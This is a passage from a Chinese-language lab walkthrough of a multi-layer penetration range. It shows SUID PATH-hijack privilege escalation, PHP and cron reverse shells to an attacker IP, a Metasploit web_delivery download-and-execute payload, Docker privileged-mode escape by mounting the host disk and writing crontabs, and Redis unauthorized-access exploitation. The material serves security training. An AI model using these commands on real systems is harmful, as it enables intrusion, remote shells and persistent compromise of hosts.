src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2009.25.29.png" alt="hostname输出" style="zoom:60%;"><ul><li>3）<code>cat /proc/self/cgroup</code></li></ul><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2009.35.54.png" style="zoom:50%;"><blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /proc/self/cgroup<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 在Linux系统中，<code>/proc/self/cgroup</code> 文件包含了当前进程（即执行 <code>cat /proc/self/cgroup</code> 命令的进程）所属的所有控制组（cgroups）的路径。这个文件可以帮助你确定当前进程是否运行在容器中，因为容器通常会有自己的cgroup配置。</p><blockquote><p>(<strong>www-data</strong>:14:name=) $ cat /proc/self/cgroup</p><p>/bin/sh: 1: cd: can’t cd to 14:name=</p><p>14:name=dsystemd:/</p><p>13:name=systemd:/docker/8e172820ac78867ecf2b58ccbeacdda40f610fbd6acd1494a4b423123cb57288</p><p>12:pids:/docker/8e172820ac78867ecf2b58ccbeacdda40f610fbd6acd1494a4b423123cb57288</p><p>11:hugetlb:/docker/8e172820ac78867ecf2b58ccbeacdda40f610fbd6acd1494a4b423123cb57288</p><p>10:net_prio:/docker/8e172820ac78867ecf2b58ccbeacdda40f610fbd6acd1494a4b423123cb57288</p><p>9:perf_event:/docker/8e172820ac78867ecf2b58ccbeacdda40f610fbd6acd1494a4b423123cb57288</p><p>8:net_cls:/docker/8e172820ac78867ecf2b58ccbeacdda40f610fbd6acd1494a4b423123cb57288</p><p>7:freezer:/docker/8e172820ac78867ecf2b58ccbeacdda40f610fbd6acd1494a4b423123cb57288</p><p>6:devices:/docker/8e172820ac78867ecf2b58ccbeacdda40f610fbd6acd1494a4b423123cb57288</p><p>5:memory:/docker/8e172820ac78867ecf2b58ccbeacdda40f610fbd6acd1494a4b423123cb57288</p><p>4:blkio:/docker/8e172820ac78867ecf2b58ccbeacdda40f610fbd6acd1494a4b423123cb57288</p><p>3:cpuacct:/docker/8e172820ac78867ecf2b58ccbeacdda40f610fbd6acd1494a4b423123cb57288</p><p>2:cpu:/docker/8e172820ac78867ecf2b58ccbeacdda40f610fbd6acd1494a4b423123cb57288</p><p>1:cpuset:/docker/8e172820ac78867ecf2b58ccbeacdda40f610fbd6acd1494a4b423123cb57288</p></blockquote><p>每一行代表不同的cgroup子系统，如CPU、内存、设备等，冒号后的路径是该子系统下的具体cgroup路径。如果路径包含类似 <code>kubepods</code> 或 <code>docker</code> 这样的词汇，这通常意味着当前环境是一个容器。</p><p>如果你在一个容器中执行这个命令，你可能会看到cgroup路径中包含容器ID或特定于容器的命名空间。如果你在一个普通的非容器环境中执行这个命令，你可能会看到不同的路径，或者路径可能直接指向根。</p></blockquote><blockquote><h2 id="什么是cgroup路径？"><a href="#什么是cgroup路径？" class="headerlink" title="什么是cgroup路径？"></a>什么是cgroup路径？</h2><p>cgroup（Control Groups）是Linux内核的一个特性，用于对进程组的物理资源（如CPU、内存、磁盘I/O等）进行细粒度的控制和监控。cgroup路径是指在cgroup文件系统层次结构中，特定cgroup的路径。</p><p>cgroup路径的作用</p><p>cgroup路径的主要作用包括：</p><ol><li><strong>资源限制</strong>：通过在cgroup路径中设置参数，可以限制或优先分配资源给特定的进程组。</li><li><strong>资源监控</strong>：可以监控特定cgroup的资源使用情况，如CPU使用率、内存使用量等。</li><li><strong>进程管理</strong>：可以将进程添加到特定的cgroup中，实现对进程的分组管理。</li></ol><p>cgroup是Linux容器技术（如Docker和Kubernetes）中实现资源隔离和限制的关键技术。通过cgroup，容器技术可以确保容器内的进程不会消耗过多的系统资源，从而保护宿主机和其他容器的稳定性。</p></blockquote><p>所以综上所述，通过CVE-2021-3129拿到一个容器中www-data用户权限的shell。</p><h1 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h1><h2 id="3-1-查找具有suid权限的文件"><a href="#3-1-查找具有suid权限的文件" class="headerlink" title="3.1 查找具有suid权限的文件"></a>3.1 查找具有suid权限的文件</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code> 是一个在Linux系统中使用的命令，用于查找系统中具有SUID（Set User ID）权限的可执行文件。下面是命令各部分的解释：</p><ul><li><code>find</code>：这是Linux中用于搜索文件的命令。</li><li><code>/</code>：指定搜索的起始目录，这里是根目录，意味着搜索将从根目录开始，遍历整个文件系统。</li><li><code>-perm -u=s</code>：这个选项告诉<code>find</code>命令查找权限设置为用户ID（User ID）具有特殊权限的文件。<code>-u=s</code>表示文件具有SUID权限。当你在 <code>find</code> 命令中使用 <code>-perm -u=s</code> 时，你实际上是在告诉 <code>find</code> 命令去搜索所有用户权限中设置了SUID的文件。</li><li><code>-type f</code>：这个选项限制搜索结果只返回文件（不包括目录）。</li><li><code>2&gt;/dev/null</code>：这部分是将标准错误（stderr）重定向到<code>/dev/null</code>，这意味着任何错误信息都不会显示在终端上。</li></ul><p><strong>SUID权限</strong>：SUID权限允许一个程序以文件所有者的身份运行，而不是以启动该程序的用户的身份运行。这通常用于需要提升权限的程序，例如<code>passwd</code>或<code>sudo</code>。</p></blockquote><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2009.51.27.png" style="zoom:70%;"><p>  <code>/home/jobs/shell</code>文件具有suid权限且名字比较可疑。</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2009.56.12.png" style="zoom:50%;"><p> shell文件是一个可执行二进制程序，并且所有用户都有执行权限。</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-07%2014.48.33.png" style="zoom:50%;"><p>执行./shell文件：</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2009.58.09.png" style="zoom:60%;"><p>发现执行了一些命令，如apache2、apache2和ps等，并且执行这些命令的时候没有用绝对路径，说明他们都能从$PATH环境变量中被找到。权限提升的思路：在/tmp目录中创建一个名称为ps但是内容为<code>/bin/bash</code>的文件，并将它的权限改成7777，然后在$PATH环境变量前添加<code>/tmp:</code>，这样以来执行./shell程序的时候，就有限会执行<code>/bin/bash</code>，又由于shell执行的时候是root权限，因此执行/bin/bash之后也会获得一个root权限的shell。</p><h2 id="3-2-反弹shell"><a href="#3-2-反弹shell" class="headerlink" title="3.2 反弹shell"></a>3.2 反弹shell</h2><p>首先通过插件市场下载<code>脚本执行</code>插件，然后加载<code>脚本执行</code>插件。</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2010.45.02.png" style="zoom:50%;"><p>kali端监听端口：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> lvp <span class="token number">2333</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>命令详解：</p><p><code>nc -lvp 2333</code> 是一个使用 netcat（通常简称为 nc）这个网络工具的命令，用于在本地计算机上监听端口 2333 的 TCP 连接。</p><ol><li><code>nc</code>：这是调用 netcat 程序的命令，netcat 是一个用于网络通信的简单 Unix 工具，它可以用于读取和写入网络连接。</li><li><code>-l</code>：这个选项告诉 netcat 进入监听模式，准备接受传入的连接。</li><li><code>-v</code>：这个选项是用于启用详细输出模式，它会在屏幕上显示更多的信息，比如连接的状态和任何错误信息。</li><li><code>-p 2333</code>：这个选项指定了 netcat 监听的端口号，这里是 2333。任何想要连接到这个端口的远程系统都会被 netcat 接受。</li></ol></blockquote><p>执行反弹shell的脚本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">system<span class="token punctuation">(</span><span class="token string">'bash -c "bash -i &gt;&amp; /dev/tcp/192.168.43.26/2333 0&gt;&amp;1"'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>命令详解：</p><p>这条命令是一个在PHP环境中执行的系统命令，它利用了PHP的<code>system</code>函数来调用bash shell，并执行一个特定的命令字符串。这个命令字符串是一个创建反向shell的技巧，通常用于渗透测试或恶意软件中。</p><ol><li><code>system</code>：这是PHP的一个函数，用于执行外部命令并显示输出。</li><li><code>'bash -c "bash -i &gt;&amp; /dev/tcp/192.168.43.26/2333 0&gt;&amp;1"'</code>：这是传递给<code>system</code>函数的命令字符串，它被单引号括起来，表示这是一个单一的字符串参数。</li><li><code>bash -c</code>：这是调用bash shell并执行后面的命令字符串。</li><li><code>'bash -i &gt;&amp; /dev/tcp/192.168.43.26/2333 0&gt;&amp;1'</code>：这是bash命令，用于创建一个反向shell。<ol><li><code>bash -i</code>：启动一个交互式的bash shell。</li><li><code>&gt;&amp;</code>：这是一个重定向操作符，用于将标准输出（stdout）和标准错误（stderr）合并并重定向到同一个目标。</li><li><code>/dev/tcp/192.168.43.26/2333</code>：这是一个Unix域套接字，用于建立一个到指定IP地址和端口的TCP连接。在这个例子中，它尝试连接到IP地址<code>192.168.43.26</code>的<code>2333</code>端口。</li><li><code>0&gt;&amp;1</code>：这将标准输入（stdin）重定向到标准输出（stdout）。这样做的目的是为了让输入和输出都通过同一个通道，即TCP连接。</li></ol></li></ol><p>这个命令的目的是创建一个反向连接，使得攻击者可以从远程IP地址<code>192.168.43.26</code>的<code>2333</code>端口访问目标机器的shell。这种技术通常被用于绕过防火墙的限制，因为大多数防火墙会允许出站连接。</p></blockquote><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2010.46.26.png" style="zoom:50%;"><p>kali linux获取反弹的shell</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2010.49.26.png" style="zoom:30%;"><h2 id="3-3-权限提升获取root权限"><a href="#3-3-权限提升获取root权限" class="headerlink" title="3.3 权限提升获取root权限"></a>3.3 权限提升获取root权限</h2><p>执行过程如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /tmp<span class="token builtin class-name">echo</span> <span class="token string">"/bin/bash"</span> <span class="token operator">&gt;</span> <span class="token function">ps</span> <span class="token comment"># /bin/bash 的权限 -rwxr-xr-x 1 root root </span><span class="token function">chmod</span> <span class="token number">777</span> <span class="token function">ps</span><span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span> <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/tmp:<span class="token environment constant">$PATH</span> <span class="token comment"># 将/tmp添加到环境变量中，并且先加载执行/tmp里的程序</span><span class="token builtin class-name">cd</span> /home/jobs./shell<span class="token comment"># 然后就获得了root权限，可以执行命令了</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>具体的执行过程：</p><p>www-data@8e172820ac78:/var/www/html$ cd /tmp<br>cd /tmp<br>www-data@8e172820ac78:/tmp$ ls<br>ls<br>vIjn2Lh<br>vKwfKcp<br>vuPmJKu<br>www-data@8e172820ac78:/tmp$ echo “/bin/bash” &gt; ps<br>echo “/bin/bash” &gt; ps<br>www-data@8e172820ac78:/tmp$ ls<br>ls<br>ps<br>vIjn2Lh<br>vKwfKcp<br>vuPmJKu<br>www-data@8e172820ac78:/tmp$ ls -al ps<br>ls -al ps<br>-rw-r–r– 1 www-data www-data 10 Jan  3 03:00 ps<br>www-data@8e172820ac78:/tmp$ chmod 777 ps<br>chmod 777 ps<br>www-data@8e172820ac78:/tmp$ ls -al ps<br>ls -al ps<br>-rwxrwxrwx 1 www-data www-data 10 Jan  3 03:00 ps<br>www-data@8e172820ac78:/tmp$ echo $PATH<br>echo $PATH<br>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br>www-data@8e172820ac78:/tmp$ export PATH=/tmp:$PATH<br>export PATH=/tmp:$PATH<br>www-data@8e172820ac78:/tmp$ echo $PATH<br>echo $PATH<br>/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br>www-data@8e172820ac78:/tmp$ cd /home/jobs<br>cd /home/jobs<br>www-data@8e172820ac78:/home/jobs$ ls -al<br>ls -al<br>total 32<br>drwxr-xr-x 2 root root  4096 Feb 25  2021 .<br>drwxr-xr-x 1 root root  4096 Feb 25  2021 ..<br>-rw-r–r– 1 root root    75 Feb 25  2021 demo.c<br>-rwsr-xr-x 1 root root 16712 Feb 25  2021 shell<br>www-data@8e172820ac78:/home/jobs$ ./shell<br>./shell<br>id<br>uid=0(root) gid=0(root) groups=0(root),33(www-data)<br>whoami<br>root</p></blockquote><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2011.06.21.png" style="zoom:40%;"><p>提权成功，获得容器中root权限的shell。</p><blockquote><p>为什么不直接在蚁剑中执行而需要反弹shell呢？</p><ul><li>实践操作会发现，在蚁剑的虚拟终端中无法修改$PATH环境变量。</li></ul><p>export 不奏效。</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2011.19.10.png" style="zoom:50%;"><p>也没有bashrc文件。</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2011.21.24.png" style="zoom:50%;"></blockquote><h1 id="四、容器逃逸"><a href="#四、容器逃逸" class="headerlink" title="四、容器逃逸"></a>四、容器逃逸</h1><h2 id="4-1-runc容器逃逸-CVE-2021-5736"><a href="#4-1-runc容器逃逸-CVE-2021-5736" class="headerlink" title="4.1 runc容器逃逸-CVE-2021-5736"></a>4.1 runc容器逃逸-CVE-2021-5736</h2><p>由于目标系统虽然docker、runc版本满足CVE-2021-5736利用条件，但是ubuntu 14.04版本不满足满足条件，最终未利用成功。</p><p>具体过程见本站《docker容器逃逸-CVE-2019-5736》一文。</p><h2 id="4-2-Docker特权模式容器逃逸"><a href="#4-2-Docker特权模式容器逃逸" class="headerlink" title="4.2 Docker特权模式容器逃逸"></a>4.2 Docker特权模式容器逃逸</h2><p>具体的漏洞复现见本站《Docker特权模式容器逃逸》一文。</p><p>MSF的用法见本站《MSF-Metasploit》一文。</p><h3 id="4-2-1-当前条件"><a href="#4-2-1-当前条件" class="headerlink" title="4.2.1 当前条件"></a>4.2.1 当前条件</h3><p>已经获取到了root权限的容器shell。</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-07%2014.57.29.png" style="zoom:40%;"><h3 id="4-2-2-判断容器是否特权运行"><a href="#4-2-2-判断容器是否特权运行" class="headerlink" title="4.2.2 判断容器是否特权运行"></a>4.2.2 判断容器是否特权运行</h3><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-07%2014.58.23.png" style="zoom:50%;"><p>CapEff的值表明当前容器是用特权模式启动的。</p><h3 id="4-2-3-挂载宿主机的根目录"><a href="#4-2-3-挂载宿主机的根目录" class="headerlink" title="4.2.3 挂载宿主机的根目录"></a>4.2.3 挂载宿主机的根目录</h3><p>在低权限的shell是没法执行的。</p><p> <img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-07%2015.00.14.png" alt="截屏2025-01-07 15.00.14"></p><p>在root权限的shell中执行<code>fdisk -l</code></p><blockquote><p><code>fdisk -l</code> 是一个常用的命令，用于列出系统中所有可用的磁盘分区信息。<code>fdisk</code> 是一个磁盘分区表操作工具，而 <code>-l</code> 选项用于列出所有分区表信息，而不进行任何修改.</p></blockquote><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-07%2015.01.06.png" style="zoom:40%;"><p>创建一个目录，挂载/dev/sda1</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> hack<span class="token function">mount</span> /dev/sda1 /home/hack<span class="token function">ls</span> hack<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-07%2015.04.10.png" style="zoom:40%;"><p>可以看到宿主机的磁盘文件已经挂载到了hack目录中。</p><p>接下来，可以通过操作宿主机的磁盘目录来篡改定时任务，执行反弹shell的操作。</p><h3 id="4-2-4-MSF-web-delivery模块创建payload"><a href="#4-2-4-MSF-web-delivery模块创建payload" class="headerlink" title="4.2.4 MSF-web_delivery模块创建payload"></a>4.2.4 MSF-web_delivery模块创建payload</h3><p>首先使用metasploit的web_delivery模块生成payload命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use exploit/multi/script/web_delivery<span class="token builtin class-name">set</span> target <span class="token number">7</span>    <span class="token comment"># 选择目标系统</span><span class="token builtin class-name">set</span> payload linux/x64/meterpreter/reverse_tcp<span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.43.26<span class="token builtin class-name">set</span> lport <span class="token number">4446</span>exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-07%2015.15.55.png" style="zoom:50%;"><p>执行exploit之后，注意看最后的提示，在目标主机上运行如下命令，在受害主机上执行一个反弹shell的脚本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> <span class="token parameter variable">-qO</span> 4dsxUgj2 --no-check-certificate http://192.168.43.26:8080/l16V8k4P5u5n56<span class="token punctuation">;</span> <span class="token function">chmod</span> +x 4dsxUgj2<span class="token punctuation">;</span> ./4dsxUgj2<span class="token operator">&amp;</span> disown<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-07%2015.16.43.png" style="zoom:50%;"><h3 id="4-2-5-写入恶意定时任务"><a href="#4-2-5-写入恶意定时任务" class="headerlink" title="4.2.5 写入恶意定时任务"></a>4.2.5 写入恶意定时任务</h3><h4 id="1）写入-var-spool-cron-crontabs-root中"><a href="#1）写入-var-spool-cron-crontabs-root中" class="headerlink" title="1）写入 /var/spool/cron/crontabs/root中"></a>1）写入 /var/spool/cron/crontabs/root中</h4><p>在root权限的容器shell中写入定时任务：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'* * * * * wget -qO 4dsxUgj2 --no-check-certificate http://192.168.43.26:8080/l16V8k4P5u5n56; chmod +x 4dsxUgj2; ./4dsxUgj2&amp; disown'</span> <span class="token operator">&gt;&gt;</span> hack/var/spool/cron/crontabs/root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-07%2015.22.13.png" alt="截屏2025-01-07 15.22.13" style="zoom:50%;"><p>定时任务写入成功。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> hack/var/spool/cron/crontabs/root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-07%2015.22.48.png" style="zoom:50%;"><p>但是meterpreter上线失败。</p><h4 id="2）写入-etc-crontab-中"><a href="#2）写入-etc-crontab-中" class="headerlink" title="2）写入 /etc/crontab 中"></a>2）写入 /etc/crontab 中</h4><p>写入宿主机的/etc/crontab文件。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'* * * * * root wget -qO wxnPcafS --no-check-certificate http://192.168.43.26:8080/lXJ0n5m; chmod +x wxnPcafS; ./wxnPcafS&amp; disown'</span> <span class="token operator">&gt;&gt;</span> /home/hack/etc/crontab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-07%2015.56.13.png" style="zoom:30%;"><p>受害宿主机成功上线。</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-07%2015.56.43.png" alt="宿主机上线" style="zoom:50%;"><p>检查权限。</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-07%2015.57.30.png" alt="root权限获取成功" style="zoom:50%;"><p>至此web2这台机子成功拿下root权限。</p><p>上面的定时任务会每分钟执行一次，会在meterpreter疯狂弹上线，并且会快速占满目标机器的网络资源，可以适当调整执行周期，如:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'* * * * * root wget -qO JNV5T7e6 --no-check-certificate http://172.20.10.4:8080/UvxhUc3By33; chmod +x JNV5T7e6; ./JNV5T7e6&amp; disown'</span> <span class="token operator">&gt;&gt;</span> /home/hack/etc/crontab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以用date命令获取一下系统时间，然后指定在一段时间后触发一次，但是如果拿下的是容器，可能容器时间和宿主机时间会不同，需要特别注意。</p><h2 id="4-3-信息收集"><a href="#4-3-信息收集" class="headerlink" title="4.3 信息收集"></a>4.3 信息收集</h2><h3 id="4-3-2-系统基本信息"><a href="#4-3-2-系统基本信息" class="headerlink" title="4.3.2 系统基本信息"></a>4.3.2 系统基本信息</h3><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-07%2016.14.42.png" style="zoom:50%;"><h3 id="4-3-1-网络信息"><a href="#4-3-1-网络信息" class="headerlink" title="4.3.1 网络信息"></a>4.3.1 网络信息</h3><p>只有两个网段 192.168.52.20/24  和 192.168.93.10/24。</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-07%2016.07.14.png" alt="192.168.52.20/24" style="zoom:40%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-07%2016.07.44.png" style="zoom:50%;"><p>但是我们明明是从192.168.43.253:81这个端口打进容器，并获得宿主机root权限的。</p><p>分析：192.168.43.253:81是被攻陷的这台主机的反向代理。</p><h3 id="4-3-2-使用root权限进入目标主机的shell"><a href="#4-3-2-使用root权限进入目标主机的shell" class="headerlink" title="4.3.2 使用root权限进入目标主机的shell"></a>4.3.2 使用root权限进入目标主机的shell</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">metepreter<span class="token operator">&gt;</span>shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-07%2016.19.48.png" style="zoom:50%;"><p>通过容器映射暴露出了8000端口。</p><p>尝试用192.168.52.20:8000访问，跟用192.168.43.253:81访问是一样的，有理由确定192.168.43.253确为反向代理。</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-07%2016.20.26.png" style="zoom:30%;"><h1 id="五、redis未授权访问getshell"><a href="#五、redis未授权访问getshell" class="headerlink" title="五、redis未授权访问getshell"></a>五、redis未授权访问getshell</h1><p>在最开始的信息收集中，能够看到192.168.43.253这台机子开启了redis 6379端口，且版本为2.8.17。从基本的信息看是极有可能存在redis未授权访问漏洞的。</p><p>关于redis未授权访问漏洞的复现和利用方法，详见本站《redis未授权访问漏洞》一文：<a href="https://sxksec.cn/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/">https://sxksec.cn/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/</a></p><h2 id="5-1-服务版本信息探测"><a href="#5-1-服务版本信息探测" class="headerlink" title="5.1 服务版本信息探测"></a>5.1 服务版本信息探测</h2><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2009.24.33.png" style="zoom:40%;"><h2 id="5-2-漏洞探测"><a href="#5-2-漏洞探测" class="headerlink" title="5.2 漏洞探测"></a>5.2 漏洞探测</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">redis-cli <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.43.253<span class="token operator">&gt;</span>info<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2009.26.23.png" style="zoom:50%;"><p>可以看到kali未经授权就可以连接到远端靶机的redis服务。</p><h2 id="5-3-漏洞利用"><a href="#5-3-漏洞利用" class="headerlink" title="5.3 漏洞利用"></a>5.3 漏洞利用</h2><h3 id="5-3-1-写入计划任务"><a href="#5-3-1-写入计划任务" class="headerlink" title="5.3.1 写入计划任务"></a>5.3.1 写入计划任务</h3><h4 id="1）如果redis服务的用户权限较低"><a href="#1）如果redis服务的用户权限较低" class="headerlink" title="1）如果redis服务的用户权限较低"></a>1）如果redis服务的用户权限较低</h4><blockquote><h4 id="ubuntu计划任务目录："><a href="#ubuntu计划任务目录：" class="headerlink" title="ubuntu计划任务目录："></a>ubuntu计划任务目录：</h4><p>在 Ubuntu 系统中，不存在 <code>/var/spool/cron/root</code> 这个目录。</p><ul><li><strong>关于 cron 任务存储位置</strong>：Ubuntu 系统中，用户的 cron 任务通常存储在 <code>/var/spool/cron/crontabs</code> 目录下。每个用户的 cron 任务文件以用户名命名，例如 root 用户的 cron 任务文件就是 <code>/var/spool/cron/crontabs/root</code>。这个文件包含了 root 用户设置的定时任务，如定时备份数据、定时清理日志等操作。</li><li><strong>权限和安全性</strong>：<code>/var/spool/cron/crontabs</code> 目录的权限设置比较严格，只有特定的用户和组（通常是 crontab 组）才有权限访问和修改其中的文件，这样可以防止未授权的用户修改 cron 任务，从而保证系统的安全性和稳定性。</li></ul></blockquote><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2009.31.23.png" style="zoom:40%;"><p>无法设置为这个目录。权限不够。</p><p>尝试使用/etc/crontab文件。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">set</span> hahaha <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>* * * * * root /bin/bash -i &gt;&amp; /dev/tcp/192.168.43.26/8888 0&gt;&amp;1 <span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2009.38.57.png" 